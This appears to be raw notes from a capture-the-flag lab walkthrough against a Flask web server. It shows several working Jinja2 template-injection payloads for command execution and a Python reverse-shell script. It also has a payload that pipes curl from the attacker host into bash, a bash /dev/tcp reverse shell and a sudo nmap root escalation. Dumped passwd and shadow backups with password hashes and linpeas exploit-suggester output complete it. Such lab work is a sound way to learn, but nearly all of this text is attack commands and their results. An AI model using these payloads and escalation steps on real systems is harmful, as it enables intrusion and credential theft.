|4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" # History of marks within files (newest to oldest): > ~/Crete_Shores * 1597927385 0 " 1 0 ^ 1 0 . 28 16 + 1 40 + 28 16 > ~/.Website/templates/index.html * 1597927346 0 " 7 1 ^ 7 2 . 7 1 + 33 85 + 33 9 + 36 1 + 35 0 + 6 53 + 32 1 + 31 1 + 29 1 + 28 1 + 26 1 + 25 1 + 24 1 + 22 1 + 21 1 + 20 1 + 19 1 + 17 1 + 16 1 + 16 0 + 14 1 + 12 1 + 10 1 + 9 1 + 8 1 + 7 1 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-lah%20/home/minos/.ssh%27).read()}}

total 3.0K drwx------ 2 minos minos 3 Aug 4 2020 . drwxr-xr-x 6 minos minos 13 Aug 20 2020 .. -rw-r--r-- 1 minos minos 444 Aug 4 2020 known_hosts 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-lah%20/home/minos/.Website%27).read()}}

total 5.5K drwxr-xr-x 5 minos minos 6 Aug 3 2020 . drwxr-xr-x 6 minos minos 13 Aug 20 2020 .. drwxr-xr-x 2 minos minos 3 Aug 3 2020 __pycache__ -rwxr-xr-x 1 minos minos 323 Aug 3 2020 app.py drwxr-xr-x 2 minos minos 3 Aug 3 2020 static drwxr-xr-x 2 minos minos 3 Aug 20 2020 templates 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/.Website/app.py%27).read()}}

#!/usr/bin/python from flask import * import os app = Flask(__name__) @app.route('/') def index(): if request.args.get('key'): return render_template_string(request.args.get('key')) else: return render_template('index.html') if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20/home/minos/.Website/templates%27).read()}}

index.html 

┌──(witty㉿kali)-[~]
└─$ cat shell.py       
import pty;
RHOST=10.8.19.103
RPORT=4444
import sys
import socket
import os
import pty
s=socket.socket()
s.connect((RHOST,RPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")

http://10.10.238.128:8080/?key={{get_flashed_messages.__class__.__mro__[1].__subclasses__()[401]([%22wget%22,%20%22http://10.8.19.103:8000/shell.py%22],%20stdout=-1,%20stderr=-1).communicate()}}

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

internal server

another way revshell

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

┌──(witty㉿kali)-[~]
└─$ cat revshell1 
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.238.128 - - [02/Jul/2023 14:51:55] "GET /revshell1 HTTP/1.1" 200 -

http://10.10.238.128:8080/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%2010.8.19.103/revshell1%20|%20bash%27).read()}}

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from theseus.thm [10.10.238.128] 40798
bash: cannot set terminal process group (212): Inappropriate ioctl for device
bash: no job control in this shell
minos@Minos:/$ which python
which python
/usr/bin/python
minos@Minos:/$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
minos@Minos:/$ id
id
uid=1001(minos) gid=1001(minos) groups=1001(minos)

minos@Minos:~/.Website/templates$ cat index.html
cat index.html
<html>
	<head>
	</head>
	<body>
		<pre>
		King Minos of Crete was feared by all of the rulers
		of the lands around him. When he demanded offerings
		or men for his armies, all agreed to his demands.
		When he demanded they send tributes to honour him,
		they sent them without question.

		But his demands on Athens became too great.

		King Minos had constructed a great palace in Knossos.
		Inside this palace he instructed Daedalus to be the 
		architect of a great labyrinth, and, at the centre
		of the maze he kept his wife's son - The Minotaur.

		It was powerful, and savage, and would eat the flesh
		of the offerings sent into the labyrinth by King Minos.
		They would wander through the maze, completely lost, 
		until at last they came face to face with the Minotaur.

		As for Athens, Minos demanded every year the King send
		him seven young men and women. One year, he sent his son:
		Theseus.

		Before leaving, Theseus' father gave him a letter with 
		a message to help him on his way to Crete.

		On the bottom of the letter was a message Theseus didn't
		quite understand: 
	        TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··	
	

		<img src="{{url_for('static', filename='Knossos.jpg')}}" />
	</body>
</html>

minos@Minos:/var/backups$ sudo -l
sudo -l
Matching Defaults entries for minos on Minos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User minos may run the following commands on Minos:
    (root) NOPASSWD: /usr/bin/nmap

https://gtfobins.github.io/gtfobins/nmap/

minos@Minos:/var/backups$ TF=$(mktemp)
TF=$(mktemp)
minos@Minos:/var/backups$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
minos@Minos:/var/backups$ sudo nmap --script=$TF
sudo nmap --script=$TF

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-02 19:00 UTC
NSE: Warning: Loading '/tmp/tmp.ZjVr5CnWrw' -- the recommended file extension is '.nse'.
# whoami
root
# cd /root
# ls
dear_mr_SUID  minotaur
# cat -v minotaur

       -""\
    .-"  .`)     (
   j   .'_+     :[                )      .^--..
  i    -"       |l                ].    /      i
 ," .:j         `8o  _,,+.,.--,   d|   `:::;    b
 i  :'|          "88p;.  (-."_"-.oP        \.   :
 ; .  (            >,%%%   f),):8"          \:'  i
i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
<  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  <
`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
 `.   `        `o`88888888b`%%%%%88< Y888P""'-    ;
   "`---`.       Y`888888888;;.,"888b."""..::::'-'
          "-....  b`8888888:::::.`8888._::-"
             `:::. `:::::O:::::::.`%%'|
              `.      "``::::::''    .'
                `.                   <
                  +:         `:   -';
                   `:         : .::/
                    ;+_  :::. :..;;;       
                    ;;;;,;;;;;;;;,;;
# cat dear_mr_SUID
                 _.                              _______
           __.--'  |             ____...,---'''''     .'''-.
       _,-'        \ ____...--'''                     | '   '-._
    ,-'             |                                 |  \      -.
 ,-'                '                                 |   '       `\
|                    \                               .'    '   _,._/
|                     \                              |      '  \
|                     \                              |       \  '
||                     \                             |        \<
|\                      \                           |          \|
|'.                     \                           /           |
| |                      \                         |            '
| '.                      |                  ____,..             \
|  |                       \__,...-----''''''       `.            |
|  '.                      \                          \           '
|   |                       \                          `           \
|   '                        \                          `           |
|    |                        \                          \          \
|    '.                       '                           \          \
|     \                        \                           \       _,|
|      |                        \                           \ _,.--  |
|      '.                        ,                       _,.-'       |
'       \                  _,.-''                 __.,-''            |
 |       |             _.-'                _,.,--'                   |
 \        \        _.-'           __,.,--''                          |
 '        `.    ,-'      __..---''                                   |
 '         \ ,-'___..,--'                                            '
  \         -'''                                                     |
   .        |                                                       ,
    |       |                                                       |
    '       |                                                       |
     \      |                                                       |
      \     |                                                       |
       \    |                                                 __,.-''
        \   |                                        __,..-''
         \  |                              ___..--'''        
          \ |                     ___,.--''
           \|        ____...,--'''
            '_..,--''

Looks like you've exploited the nmap SUID.

Here's an empty box for the effort!

Perhaps checking the network information
and using the SUID based binary to look 
for other things to use that information
on that you should have got earlier.

Perhaps reading the story as you progress 
will help you, Good luck hero!


# cat passwd.bak
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
minos:x:1001:1001:,,,:/home/minos:/bin/bash
# cat shadow.bak
root:$6$aUdhO9uG$ZqouBnunknnMPCZcSgSI/hQw981KlULw6aIz3Lpj0.csKv2jZkpdpmtvgKYdf.7tBE45yRiHHt3Ss4GRT4jBO/:18477:0:99999:7:::
daemon:*:18472:0:99999:7:::
bin:*:18472:0:99999:7:::
sys:*:18472:0:99999:7:::
sync:*:18472:0:99999:7:::
games:*:18472:0:99999:7:::
man:*:18472:0:99999:7:::
lp:*:18472:0:99999:7:::
mail:*:18472:0:99999:7:::
news:*:18472:0:99999:7:::
uucp:*:18472:0:99999:7:::
proxy:*:18472:0:99999:7:::
www-data:*:18472:0:99999:7:::
backup:*:18472:0:99999:7:::
list:*:18472:0:99999:7:::
irc:*:18472:0:99999:7:::
gnats:*:18472:0:99999:7:::
nobody:*:18472:0:99999:7:::
systemd-network:*:18472:0:99999:7:::
systemd-resolve:*:18472:0:99999:7:::
syslog:*:18472:0:99999:7:::
messagebus:*:18472:0:99999:7:::
_apt:*:18472:0:99999:7:::
lxd:*:18472:0:99999:7:::
uuidd:*:18472:0:99999:7:::
dnsmasq:*:18472:0:99999:7:::
landscape:*:18472:0:99999:7:::
sshd:*:18472:0:99999:7:::
pollinate:*:18472:0:99999:7:::
minos:$6$jSUdIvQS$Fo3.S2x9LiZzg5paCZNQAxeYsAmks8rtZurBsQ4veDU51joRYSpYKt00DPAiZMkxKXwQ0wsTFuSAaIikOHmUh1:18477:0:99999:7:::

# cat /proc/1/cgroup
12:hugetlb:/
11:perf_event:/
10:pids:/
9:cpuset:/
8:rdma:/
7:devices:/
6:freezer:/
5:cpu,cpuacct:/
4:memory:/
3:net_cls,net_prio:/
2:blkio:/
1:name=systemd:/init.scope
0::/init.scope

uhmm

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.238.128 - - [02/Jul/2023 15:15:01] code 404, message File not found
10.10.238.128 - - [02/Jul/2023 15:15:05] "GET /linpeas.sh HTTP/1.1" 200 -

minos@Minos:/tmp$ wget http://10.8.19.103/linpeas.sh
wget http://10.8.19.103/linpeas.sh
--2023-07-02 19:15:08--  http://10.8.19.103/linpeas.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   570KB/s    in 1.4s    

2023-07-02 19:15:09 (570 KB/s) - ‘linpeas.sh’ saved [828098/828098]

minos@Minos:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
minos@Minos:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
User & Groups: uid=1001(minos) gid=1001(minos) groups=1001(minos)
Hostname: Minos
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

[+] nmap is available for network discovery & port scanning, you should use it yourself


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.4 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Sun Jul  2 19:15:55 UTC 2023
 19:15:55 up  3:25,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
LABEL=cloudimg-rootfs	/	 ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
USER=minos
SHLVL=4
OLDPWD=/
HOME=/home/minos
LOGNAME=minos
JOURNAL_STREAM=9:37935
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=ffd3abccfe3749fda4f0d948e88a7d76
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... No
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (lxc)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No

═╣ AWS Lambda? .......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  0.2 159540  6108 ?        Ss   15:50   0:00 /sbin/init
root        62  0.1  1.5 115824 32080 ?        Ss   15:50   0:18 /lib/systemd/systemd-journald
root        95  0.0  0.0  42108  1864 ?        Ss   15:50   0:00 /lib/systemd/systemd-udevd
stemd-networkd  0.0  0.1  80080  3664 ?        Ss   15:50   0:00 /lib/systemd/sy
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   175  0.0  0.1  70660  3704 ?        Ss   15:50   0:00 /lib/systemd/systemd-resolved
daemon[0m     194  0.0  0.0  28332  1292 ?        Ss   15:50   0:00 /usr/sbin/atd -f
root       195  0.0  0.0  31748  1640 ?        Ss   15:50   0:00 /usr/sbin/cron -f
root       196  0.0  0.1  62140  3616 ?        Ss   15:50   0:00 /lib/systemd/systemd-logind
syslog     201  0.0  0.1 197636  3304 ?        Ssl  15:50   0:10 /usr/sbin/rsyslogd -n
root       202  0.0  0.6 170832 12256 ?        Ssl  15:50   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       203  0.0  0.2 287992  4228 ?        Ssl  15:50   0:00 /usr/lib/accountsservice/accounts-daemon[0m
message+   204  0.0  0.1  50056  2724 ?        Ss   15:50   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write

minos    25783  0.0  0.0   4628   628 ?        S    18:51   0:00  _ sh -c curl 10.8.19.103/revshell1 | bash
minos    25785  0.0  0.0  13312  1832 ?        S    18:51   0:00  |   _ bash
minos    25786  0.0  0.0  13312  1916 ?        S    18:51   0:00  |       _ bash -c bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
minos    25787  0.0  0.1  22828  3560 ?        S    18:51   0:00  |           _ bash -i
minos    25798  0.0  0.2  35096  5884 ?        S    18:53   0:00  |               _ python -c import pty;pty.spawn("/bin/bash")
minos    25799  0.0  0.1  22956  3556 pts/0    Ss   18:53   0:00  |                   _ /bin/bash
root     25836  0.0  0.1  68300  2956 pts/0    S    19:00   0:00  |                       _ sudo nmap --script=/tmp/tmp.ZjVr5CnWrw
root     25837  0.0  1.0  68756 22388 pts/0    S    19:00   0:00  |                           _ nmap --script=/tmp/tmp.ZjVr5CnWrw
8   640 pts/0    S    19:00   0:00  |                               _ sh -c /bin/sh
root     25839  0.0  0.0   4628  1196 pts/0    S    19:00   0:00  |                                   _ /bin/sh
root     25898  0.0  0.0   8064   604 pts/0    S+   19:12   0:00  |                                       _ cat console
minos    25908  0.0  0.0   4628   636 ?        S    19:13   0:00  _ sh -c curl 10.8.19.103/revshell1 | bash
minos    25910  0.0  0.1  13312  2156 ?        S    19:13   0:00      _ bash
minos    25911  0.0  0.1  13312  2156 ?        S    19:13   0:00          _ bash -c bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
minos    25912  0.0  0.1  22828  3608 ?        S    19:13   0:00              _ bash -i
minos    25923  0.0  0.2  35096  5936 ?        S    19:14   0:00                  _ python -c import pty;pty.spawn("/bin/bash")
minos    25924  0.0  0.1  22820  3600 pts/1    Ss   19:14   0:00                      _ /bin/bash
minos    25937  0.0  0.1   5352  2076 pts/1    S+   19:15   0:00                          _ /bin/sh ./linpeas.sh
minos    29346  0.0  0.0   5352   876 pts/1    S+   19:18   0:00                              _ /bin/sh ./linpeas.sh
minos    29350  0.0  0.1  37956  2252 pts/1    R+   19:18   0:00                              |   _ ps fauxwww
minos    29349  0.0  0.0   5352   876 pts/1    S+   19:18   0:00                              _ /bin/sh ./linpeas.sh
root       217  0.0  0.6 187620 13068 ?        Ssl  15:50   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       221  0.0  0.0  16412  1212 ?        Ss+  15:50   0:00 /sbin/agetty -o -p -- u --noclear --keep-baud console 115200,38400,9600 vt220
root       222  0.0  0.2 288884  4204 ?        Ssl  15:50   0:00 /usr/lib/policykit-1/polkitd --no-debug
